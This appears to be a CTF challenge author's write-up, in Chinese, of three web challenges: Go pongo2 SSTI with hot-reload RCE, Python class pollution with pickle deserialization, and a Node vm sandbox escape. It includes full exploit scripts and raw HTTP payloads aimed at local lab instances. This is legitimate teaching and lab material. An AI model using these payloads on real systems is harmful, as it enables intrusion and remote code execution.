## go2RCE

考点：go SSTI、热部署

出题人：ch3

难度：困难



### 代码审计

SSTI的原理就不解释了，懂的都懂，不懂的自己google吧

SESSION_KEY在给大家的附件中是fake，需要自己通过漏洞泄露

这里有三个路由`/`，`/welcome`，`/welcome/username`，`/admin`

然后去看对应的路由文件，Index里设置了session-name的session

然后welcome要求POST传username和skill

admin使用了pongo2模板来解析

### SSTI

#### SSTI读取Session-Key

参考：https://tyskill.github.io/posts/gossti/

这个b后端算是写得很刻意了。。

![image-20240328102028141](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826003.png)

妥妥模板注入

![image-20240328102107423](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826769.png)

![image-20240328102159824](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826931.png)



泄露session-key后，拿去ascii解码，顺道填入最开始设置SESSION_KEY的环境变量的位置

接下来就是本地的session伪造了，既然有了session-key，直接本地改下，然后启动服务

![image-20240327162822609](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826266.png)

获得admin-session如下：

> MTcxMTA2NTkzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzaXqKrp-8lPsyq0EqYjYDyChtvEVjpT-5vNJCAFJBclw==

![image-20240328102748286](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826986.png)



#### Pongo2 SSTI文件写 + 热部署特性 = 实现RCE

具体的可以查下pongo2 SSTI以及context的相关文档，参考：https://dummykitty.github.io/go/2023/05/30/Go-pongo-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html

poc:

![image-20240327164048893](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826066.png)



那么问题来了？可以任意读、任意写，但是不知道flag在哪，不妨想想怎么进一步getshell

由于我使用的是fresh热部署，当服务文件修改时，会重新编译执行go文件，此处也是RCE的办法

利用：

- 读源码

![image-20240328182356447](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826758.png)



- 然后写文件，多写一条RCE的路由（~~考虑到没有校内vps，不然一般直接反弹shell~~）

``` http
GET /admin?name=%7B%25%20include%20c.SaveUploadedFile(c.FormFile(c.Request.Header.Filetype%5B0%5D),c.Request.Header.Filepath%5B0%5D)%20%25%7D HTTP/1.1
Host: 127.0.0.1:3000
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Filetype: file
Filepath: /home/ctfer/app/main.go
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: csrftoken=q8pYXi0Pe5IGRo6rCTonyIMChfFpovj1; session-name=MTcxMTA2NTkzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzaXqKrp-8lPsyq0EqYjYDyChtvEVjpT-5vNJCAFJBclw==
Connection: close
Content-Type: multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe

--01f54ee8f2872c8a0d42d14f70cdc1fe
Content-Disposition: form-data; name="file"; filename="test.png"
Content-Type: image/png

package main

import (
	"github.com/gin-gonic/gin"
	"main/route"
	"os"
	"os/exec"
)

func main() {
	//I don't tell you the session key, can you find it?
	//err := os.Setenv("SESSION_KEY", "fake_session_key")
	err := os.Unsetenv("GZCTF_FLAG")
	if err != nil {
		return
	}
	err = os.Setenv("SESSION_KEY", "th1s_1s_w3b_g0_ch4l1eng3")
	if err != nil {
		return
	}
	r := gin.Default()
	r.GET("/", route.Index)
	r.GET("/welcome", route.Welcome)
	r.GET("/welcome/:username", route.Welcome)
	r.GET("/admin", route.Admin)

	r.GET("/getflag", func(c *gin.Context) {
		cmd := exec.Command("ls")
		// cmd := exec.Command("cat","hhhnb_f14g_0h_y0u_g0t_1t_6666666")
		flag, err := cmd.CombinedOutput()
		if err != nil {
			c.String(500, "error")
		}
		c.String(200, string(flag))
	})

	err = r.Run("0.0.0.0:80")
	if err != nil {
		return
	}
}
--01f54ee8f2872c8a0d42d14f70cdc1fe--

```

![image-20240328182539731](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826485.png)



然后读flag即可

![image-20240328182625676](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826703.png)





### 我的出题踩坑点

- 由于GZCTF平台的缘故，我原本使用gin来热部署，但是在docker端口暴露上出现了问题（因为gin需要额外的hot-deploy-proxy-port），后面换用了fresh
- 也是平台的缘故，改用shell脚本启动服务，这里也是删去环境变量防止非预期的手法



## 蟒蛇宝宝

考点：python原型链污染，pickle反序列化

出题人：ch3

难度：困难

### python原型链污染

原理请参考ttt社区：https://tttang.com/archive/1876/

可以调试一下merge函数，在`__init__.__globals__`下可以获得`admin`对象

那么可以污染到变量信息，我们可以修改admin的密码

    payload = {
        "username": new_username,
        "password": new_password,
        "__init__": {
            "__globals__": {
                "admin": {
                    "password": admin_password
                }
            }
        }
    }



### pickle反序列化

漏洞利用点在Show函数中的pickle.loads，这是一个很危险的地方

而且pickle反序列化的前提时我们能够重写类，所以红框上一行的loads就用不了了

![image-20240411174112111](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746961.png)

~~由于学校防火墙以及网络配置等问题，反弹shell操作基本不可能，再说大多数同学应该没有vps吧~~

所以RCE的结果怎么给外带呢？

注意到有个static文件夹，这里的文件是可读可下载的，那么我们在`__reduce__`里可以将flag写入到static中的文件，然后下载即可获得flag

![image-20240411174515840](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746405.png)

![image-20240411174639676](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746037.png)

### 完整EXP

``` python
import base64
import os
import pickle
import argparse
import requests
import time

# the attack url
baseURL = "http://127.0.0.1:40825"

s = requests.session()



# rewrite the user class
class Message:

    def __init__(self, _message, _status):
        self.message = _message
        self.status = _status

    def __reduce__(self):
        return (os.system, ('cat /flag > /app/static/img.png',))

# register
def AdminPasswordPollute(admin_password, new_username, new_password):
    payload = {
        "username": new_username,
        "password": new_password,
        "__init__": {
            "__globals__": {
                "admin": {
                    "password": admin_password
                }
            }
        }
    }
    registerURL = "/register"
    req = s.post(url=baseURL + registerURL, json=payload)
    # time.sleep(1)
    if req.status_code == 200:
        print(f"[+]register attack success, you can login as admin by the password: {admin_password}")
    else:
        print(f"[-]attack error when registering")
        exit(-1)


# login
def LoginAndPickleAttack(admin_password, new_username, new_password):
    payload = {
        "username": "admin",
        "password": admin_password
    }

    # login as admin
    loginURL = "/login"
    req = s.post(url=baseURL + loginURL, json=payload)
    # time.sleep(1)
    if req.status_code == 200:
        print("[+]Now login as admin")
    else:
        print("[-]fail to login as admin")
        exit(-1)
    

    badmsg = Message("attack", "good")
    badmsgbytes = pickle.dumps(badmsg, protocol=4)
    editURL = "/profile/admin/edit"
    payload1 = {
        "message": base64.b64encode(badmsgbytes).decode('utf-8'),
        "status": "nice"
    }

    req1 = s.post(url=baseURL + editURL, json=payload1)
    time.sleep(1)
    if req1.status_code == 200:
        print("[+]upload the attack payload success")
    else:
        print("[-]upload the attack payload fail")
        exit(-1)



    # now trigger the python pickle ==> RCE
    viewURL = f"/profile/admin/view/api"
    req2 = s.get(url=baseURL + viewURL)
    # time.sleep(1)
    if req2.status_code == 200:
        print("[+]RCE Success!")
    else:
        print("[-]RCE Fail..")
        exit(-1)

    s.close()
	
		
    os.system(f"wget {baseURL}/static/img.png -q")
    print('[+]the flag is:')
    os.system("cat ./img.png")
    



if __name__ == '__main__':
    parse = argparse.ArgumentParser()
    parse.add_argument("-AP", type=str, default="123456", help="you can reset the admin password by -AdminP option")
    parse.add_argument("-U", type=str, default="tester", help="the new register user's username")
    parse.add_argument("-P", type=str, default="tester", help="the new register user's password")

    args = parse.parse_args()
    
    adminPassword = args.AP
    registerUsername = args.U
    registerPassword = args.P

    AdminPasswordPollute(admin_password = adminPassword, new_username=registerUsername, new_password=registerPassword)
    LoginAndPickleAttack(admin_password = adminPassword, new_username=registerUsername, new_password=registerPassword)

```



### 我的出题踩坑点

- 当部署在Windows上时直接访问api接口可以打通，但是部署到docker中的“Linux”环境下给我报了500，好怪~

![image-20240409223338542](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111747109.png)

![image-20240409223410734](https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111747317.png)

​	后面检查了下是由于python pickle序列化时会生成的字节会受到操作系统不同的影响（因为当时exp是在windows下写的）

​	所以后面在我的kali里装了个WSRX，然后exp打一遍，通了



## vm出逃计划

考点：绕过waf读取敏感文件，vm逃逸（CVE）

出题人：ch3

难度：简单

### 思路

默认路由下会生成vmtoken，这是进入sandbox执行任意代码的一个check

在show路由下可以读，但是有个tricky的小waf，payload自己调试构造出来如下：

``` 
payload1 = '?path=.jpg./../vmtoken.txt'
```

然后就是一个NodeJS的VM沙箱逃逸历史洞，对照历史版本去GitHub的issue里面找就行

### 完整EXP

``` python
import requests
import time
from urllib.parse import quote

baseURL = "http://127.0.0.1:3000"
s = requests.Session()

# generate token
resp = s.get(baseURL)

time.sleep(1)

# Read token
attackURL1 = '/show'
payload1 = '?path=.jpg./../vmtoken.txt'
resp = s.get(baseURL+attackURL1+payload1)
if resp.status_code == 200:
    print(f'[+]get vm token: {resp.text}')
else:
    print(f'[-]can not get the vm token')
    s.close()
    exit(1)

token = resp.text

# RCE
attackURL2 = '/sandbox'

# 这个payload只能RCE一次,有点怪
rcecode1 = """
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('cat /flag > ./img/flag.txt');
};
"""

rcecode2 = """
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag > ./img/flag.txt'); }
            )
        }
    }
};
p.then();"""

payload2 = f'?vmtoken={token}&code={rcecode2}'
resp2 = s.get(baseURL+attackURL2+payload2)
if resp2.status_code == 200:
    print(f'[+]rce success')
else:
    print(f'[-]rce fail')
    s.close()
    exit(1)

# Get flag
attackURL3 = '/show'
payload3 = '?path=.jpg./../flag3.txt'

resp3 = s.get(baseURL+attackURL3+payload3)

if resp3.status_code == 200:
     print(f'[+]now get flag: {resp3.text}')
# else:
#     print(f'[-]fail to get flag')
#     s.close()
#     exit(1)

s.close()
```



### 我的出题踩坑点

- CRLF的影响：解决方案=>使用python脚本实现网络交互，这样会比直接在浏览器GUI下操作更加细腻

- 两个payload进行RCE的效果不同，一个只能RCE一次（还没调试过）